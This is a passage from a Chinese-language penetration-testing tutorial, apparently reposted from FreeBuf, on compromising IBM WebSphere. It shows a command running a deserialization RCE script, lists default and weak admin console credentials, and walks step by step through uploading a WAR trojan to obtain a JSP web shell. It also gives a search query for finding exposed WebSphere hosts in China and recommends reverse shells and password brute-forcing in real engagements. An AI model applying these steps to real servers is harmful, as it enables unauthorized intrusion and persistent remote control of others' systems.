![44](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6df1de609af16a3f4d10fffad6cc6a3134e8fab5.png)

```php
python websphere_rce.py 127.0.0.1:8880 'touch /tmp/success' --proto
```

![45](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-023b08404944315b33422aef8c0d0f84f51dc840.png)

弱口令&amp;&amp;后台Getshell
-----------------------

在6.x至7.0版本，后台登录只需要输入admin作为用户标识，无需密码，即可登录后台

websphere/ websphere

system/ manager

<http://127.0.0.1:9060/ibm/console/logon.jsp>

<https://127.0.0.1:9043/ibm/console/logon.jsp>

登录IBM-websphere

7.0：

直接admin即可登录进入

![46](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d32e6855d4159b8458df98e58810e4fe55d52ec0.png)

![48](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bdb197a0f5eb61388205bf2030d7fd5a09dac7f9.png)

8.5：

可以尝试弱口令

![47](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e1bae027844bc2f33c030f04657d1235fb7886ee.png)

![49](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6a5ceac3e9d61ce2ae6851f14afa0ecd47d33e65.png)

通过新建企业应用程序上次木马

![50](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-64179b21e63fb546a20e90ec298a0db129dcaab3.png)

选择要上次的war包，上传war木马包

![51](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-18cb34c7e9140b10d155994013f4385cfd31792e.png)

写入包名称，一直下一步直到最后，选择目录为war包名称即可

![52](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1b4a3a6161145ef1f4ca7716dc2d82bca30d227c.png)

这里点击finsh稍微等一会

保存到主配置

![53](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-83b988ffd360cd9baae981e2fc77f1b899063a70.png)

启动War：

```php
Application Types-WebSphere enterprise
```

然后选择部署好的war包点击start启动

![54](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3c6ee6f955ab0f0131fd8af79e328424e4b8f22b.png)

![55](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d1ab8ec1143065a9edf5fd2828e797c41d26154d.png)

成功getshell

shell地址： [http://127.0.0.1:9080/war包名称/木马名称.jsp](http://127.0.0.1:9080/war%E5%8C%85%E5%90%8D%E7%A7%B0/%E6%9C%A8%E9%A9%AC%E5%90%8D%E7%A7%B0.jsp)

实战情况
----

"WebSphere" &amp;&amp; port="8880" &amp;&amp; country="CN"

:9060/ibm/console/logon.jsp

:9043/ibm/console/logon.jsp

反序列化拿shell，直接一句话反弹就行

后门getshell，弱口令非常多，实战底层密码可爆破

最近在渗透测试中遇到好多弱口令后台，可按上面方法getshell

![1](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f7b01e8c23933f8f30adda0fdc619b2b75260886.png)

![2](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6e9fd4847d53fb229bf0bbca4e772ef9b1dca5b2.png)

![3](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-84d0dff3cf0dae5a9d92ce2ebc88cd8697e6f2fb.png)

并且也存在Java反序列化

![4](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-656d454c0550430d0e9bb219e0e090de1ff95f28.png)

文章转载自 <https://www.freebuf.com/vuls/284715.html>